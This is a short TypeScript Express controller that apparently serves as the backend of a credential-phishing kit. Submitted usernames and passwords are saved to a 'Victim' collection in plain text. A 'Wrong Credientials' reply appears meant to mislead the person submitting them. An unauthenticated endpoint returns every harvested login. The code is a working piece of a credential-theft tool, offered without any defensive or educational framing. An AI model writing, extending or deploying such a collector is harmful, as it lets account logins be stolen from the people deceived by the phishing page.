import { Request, Response } from "express";
import Victims from "../models/Victim";

// GET - All Victims
const getVictims = async (req: Request, res: Response): Promise<void> => {
    try{
        const victims = await Victims.find();

        if(!victims){
            res.status(403).json({success: false, msg: "Could not find Victims"});
        }else{
            res.status(200).json({success: true, victims});
        }
    }catch (e){
        res.status(500).json({success: false, msg: "Server Error err: 500"});
        console.error(e);
    }
}

// POST - Create Victim
const createVictim = async (req: Request, res: Response): Promise<void> => {
    try{
        const { username, password } = req.body;

        if(!username && !password){
            res.status(400).json({success: false, msg: "Please fill out required fields"});
            return;
        }

        const newVictim = await Victims.create({
            username,
            password
        });

        if(!newVictim){
            res.status(403).json({success: false, msg: "Wrong Credientials"});
        }else{
            res.status(200).json({success: true, user: newVictim});
        }
    }catch (e){
        res.status(500).json({success: false, msg: "Server Error err: 500"});
        console.error(e);
    }
}

export { getVictims, createVictim };